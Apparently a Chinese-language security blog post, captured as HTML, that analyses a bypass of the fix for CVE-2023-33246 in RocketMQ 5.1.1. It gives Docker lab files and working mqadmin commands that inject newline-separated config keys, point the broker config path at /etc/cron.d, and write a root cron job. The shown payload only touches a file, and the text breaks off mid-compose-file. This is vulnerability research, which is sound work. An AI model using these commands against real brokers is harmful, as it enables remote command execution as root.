@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="CVE-2023-33246 是通过updateBrokerConfig更新Broker的filterServerNums和rocketmqHome这两项配置进行RCE的（rocketmqHome会被拼接到命令中执行，filterServerNums&gt;0 是进入命令执行的前提条件） 修复的逻辑是直接删除相关代码 但从仓库的修复代码来看，还存在另一处RCE的点，不过官方只发布了上述一个CVE编">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RocketMQ 5.1.1写计划任务RCE">
+<meta property="og:url" content="https://l3yx.github.io/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="CVE-2023-33246 是通过updateBrokerConfig更新Broker的filterServerNums和rocketmqHome这两项配置进行RCE的（rocketmqHome会被拼接到命令中执行，filterServerNums&gt;0 是进入命令执行的前提条件） 修复的逻辑是直接删除相关代码 但从仓库的修复代码来看，还存在另一处RCE的点，不过官方只发布了上述一个CVE编">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-06-15T14:18:18.000Z">
+<meta property="article:modified_time" content="2023-06-15T14:22:36.281Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="RocketMQ">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/","path":"2023/06/15/RocketMQ-5-1-1写计划任务RCE/","title":"RocketMQ 5.1.1写计划任务RCE"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>RocketMQ 5.1.1写计划任务RCE | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">断点调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%88%E6%94%BB%E5%87%BBBroker%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">绕过方法一（攻击Broker）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.2.</span> <span class="nav-text">复现步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE%EF%BC%8C%E9%80%9A%E8%BF%87%E6%8D%A2%E8%A1%8C%E7%AC%A6%E6%B3%A8%E5%85%A5%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="nav-number">3.2.1.</span> <span class="nav-text">更新其他配置，通过换行符注入自定义配置项</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A9%E8%BF%9C%E7%AB%AFBroker%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E9%85%8D%E7%BD%AE%E7%94%9F%E6%95%88"><span class="nav-number">3.2.2.</span> <span class="nav-text">让远端Broker配置文件中的配置生效</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">3.2.3.</span> <span class="nav-text">在配置文件中写入计划任务</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%88%E6%94%BB%E5%87%BBBrokerContainer%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">绕过方法二（攻击BrokerContainer）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">4.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.2.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9A%84Broker"><span class="nav-number">4.2.1.</span> <span class="nav-text">创建配置文件路径为计划任务的Broker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">4.2.2.</span> <span class="nav-text">触发配置文件写入</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="RocketMQ 5.1.1写计划任务RCE | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          RocketMQ 5.1.1写计划任务RCE
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-15 22:18:18 / 修改时间：22:22:36" itemprop="dateCreated datePublished" datetime="2023-06-15T22:18:18+08:00">2023-06-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">CVE-2023-33246</a> 是通过<code>updateBrokerConfig</code>更新Broker的<code>filterServerNums</code>和<code>rocketmqHome</code>这两项配置进行RCE的（<code>rocketmqHome</code>会被拼接到命令中执行，<code>filterServerNums</code>&gt;0 是进入命令执行的前提条件）</p>
+<p>修复的逻辑是直接删除相关代码</p>
+<p>但从仓库的修复代码来看，还存在另一处RCE的点，不过官方只发布了上述一个CVE编号</p>
+<span id="more"></span>
+
+<p>另一处RCE的修复代码为：<a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/pull/6733/files">https://github.com/apache/rocketmq/pull/6733/files</a></p>
+<p>修复的逻辑是不允许远程更新以下配置项：</p>
+<blockquote>
+<p>brokerConfigPath<br>configStorePath<br>kvConfigPath<br>configStorePathName</p>
+</blockquote>
+<p>而这些配置项都是指定不同配置文件的存储路径，那么RCE的方式就是在root权限的前提下将配置文件的路径改为cron定时任务路径</p>
+<p>这个RCE的点随 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">CVE-2023-33246</a> 一起于 RocketMQ 5.1.1 的发布而修复</p>
+<p>然而官方的这种修复方式存在绕过</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>受影响的服务有两个，Broker 和 BrokerContainer，利用条件不同：</p>
+<ul>
+<li>Broker （默认端口10911）<ul>
+<li>root权限运行</li>
+<li>重启一次</li>
+<li>cron服务</li>
+</ul>
+</li>
+<li>BrokerContainer （默认端口10811）<ul>
+<li>root权限运行</li>
+<li>cron服务</li>
+</ul>
+</li>
+</ul>
+<h2 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h2><p>Broker或者NameSrv等服务会监听端口，以RocketMQ协议通信（TCP + JSON），在相应服务的<code>processRequest</code>中下断点即可</p>
+<blockquote>
+<p>org.apache.rocketmq.broker.processor.AdminBrokerProcessor#processRequest<br>org.apache.rocketmq.namesrv.processor.DefaultRequestProcessor#processRequest<br>org.apache.rocketmq.container.BrokerContainerProcessor#processRequest</p>
+</blockquote>
+<h2 id="绕过方法一（攻击Broker）"><a href="#绕过方法一（攻击Broker）" class="headerlink" title="绕过方法一（攻击Broker）"></a>绕过方法一（攻击Broker）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>dockerfile</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jdk</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install vim netcat iputils-ping net-tools cron -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    wget https://archive.apache.org/dist/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    unzip rocketmq-all-5.1.1-bin-release.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /rocketmq-all-5.1.1-bin-release/bin/</span></span><br></pre></td></tr></table></figure>
+
+<p>docker-compose.yml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">broker:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbroker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10909</span><span class="string">:10909</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10911</span><span class="string">:10911</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10912</span><span class="string">:10912</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9555</span><span class="string">:9555</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqbroker</span> <span class="string">-n</span> <span class="string">namesrv:9876</span> <span class="string">-c</span> <span class="string">../conf/broker.conf</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>启动环境之后，需要手动在Broker机器上开启cron</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service cron start</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>有多种方式可以远程更新RocketMQ配置，最简单的是起一个RocketMQ的docker环境，利用其中的<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/deploymentOperations/02admintool">mqadmin</a>命令行工具</p>
+<h4 id="更新其他配置，通过换行符注入自定义配置项"><a href="#更新其他配置，通过换行符注入自定义配置项" class="headerlink" title="更新其他配置，通过换行符注入自定义配置项"></a>更新其他配置，通过换行符注入自定义配置项</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k storePathRootDir -v <span class="string">&#x27;/tmp/store\nbrokerConfigPath=/etc/cron.d/test&#x27;</span> -b host.docker.internal:10911</span><br></pre></td></tr></table></figure>
+
+<p>执行完这条命令后，远端Broker的<code>storePathRootDir</code>这项配置在内存中的值是<code>/tmp/store\nbrokerConfigPath=/etc/cron.d/test</code>，但同时这项配置也会被写入配置文件，在Broker这台机器上，配置文件<code>conf/broker.conf</code>内容将会如下：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">...</span></span><br><span class="line"><span class="attr">storePathRootDir</span>=<span class="string">/tmp/store</span></span><br><span class="line"><span class="attr">brokerConfigPath</span>=<span class="string">/etc/cron.d/test</span></span><br><span class="line"><span class="attr">...</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="让远端Broker配置文件中的配置生效"><a href="#让远端Broker配置文件中的配置生效" class="headerlink" title="让远端Broker配置文件中的配置生效"></a>让远端Broker配置文件中的配置生效</h4><p>目前只是配置文件中的<code>brokerConfigPath</code>为指定的计划任务路径，其实并未被程序读取加载，让远端读取加载的方式可能存在多种，目前我只发现重启机器的方法（很鸡肋</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart rmqbroker</span><br></pre></td></tr></table></figure>
+
+<p>容器中的cron不会自启动，还需要再次进入Broker容器手动启动cron</p>
+<h4 id="在配置文件中写入计划任务"><a href="#在配置文件中写入计划任务" class="headerlink" title="在配置文件中写入计划任务"></a>在配置文件中写入计划任务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k bindAddress -v <span class="string">&#x27;0.0.0.0\n* * * * * root touch /tmp/success&#x27;</span> -b host.docker.internal:10911</span><br></pre></td></tr></table></figure>
+
+<p>此时Broker就会将配置写入<code>/etc/cron.d/test</code>文件</p>
+<p>还需要将value为空的配置进行数据填充</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k controllerAddr -v 127.0.0.1 -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k messageStorePlugIn -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsLabel -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterHeader -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterTarget -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsPromExporterHost -v 127.0.0.1 -b host.docker.internal:10911</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为测试cron的时候遇到一个坑，当计划任务文件包含<code>key=空</code>的行时将不会执行，不知道其他版本或系统是否这样</p>
+</blockquote>
+<p>至多1分钟后，命令将被执行</p>
+<h2 id="绕过方法二（攻击BrokerContainer）"><a href="#绕过方法二（攻击BrokerContainer）" class="headerlink" title="绕过方法二（攻击BrokerContainer）"></a>绕过方法二（攻击BrokerContainer）</h2><p>BrokerContainer介绍：<a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/wiki/RIP-31-Support-RocketMQ-BrokerContainer">https://github.com/apache/rocketmq/wiki/RIP-31-Support-RocketMQ-BrokerContainer</a></p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>docker-compose.yml 需要修改如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">brokercontainer:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbrokercontainer</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">6888</span><span class="string">:6888</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10811</span><span class="string">:10811</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9555</span><span class="string">:9555</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">          printf &quot;listenPort=10811\nnamesrvAddr=namesrv:9876\n&quot; &gt; broker-container.conf</span></span><br><span class="line"><span class="string">          sh mqbrokercontainer -c broker-container.conf</span></span><br><span class="line"><span class="string"></span>    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    